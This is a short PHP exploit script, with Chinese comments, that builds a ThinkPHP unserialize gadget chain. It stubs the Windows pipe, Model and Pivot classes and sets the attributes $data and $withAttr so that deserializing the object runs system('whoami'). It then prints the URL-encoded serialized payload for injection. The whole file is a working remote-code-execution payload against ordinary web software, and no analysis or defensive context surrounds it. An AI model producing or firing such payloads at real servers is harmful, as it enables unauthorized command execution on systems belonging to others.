<?php
namespace think\process\pipes{
    class Windows{
        public function __construct($s){
            $this->files = array($s);
        }
    }

}

namespace think\model\concern{
    trait Conversion{
    }
    trait Attribute{
        // private $data = ['test' => "whoami"]; 	//此处2个键名要相同，值为$value
        // private $withAttr = ['test' => "system"];	//此处2个键名要相同，值为$closure
    }
}

namespace think{
    class Model{
        use model\concern\Conversion;
        use model\concern\Attribute;
        private $data = ['test' => "whoami"];   //此处2个键名要相同，值为$value
        private $withAttr = ['test' => "system"];   //此处2个键名要相同，值为$closure
    }
}

namespace think\model{
    use think\Model;
    class Pivot extends Model{
    }
}

namespace{
    $string = new think\model\Pivot();
    $payload = new think\process\pipes\Windows($string);
    echo urlencode(serialize($payload));
    // echo serialize($payload);
}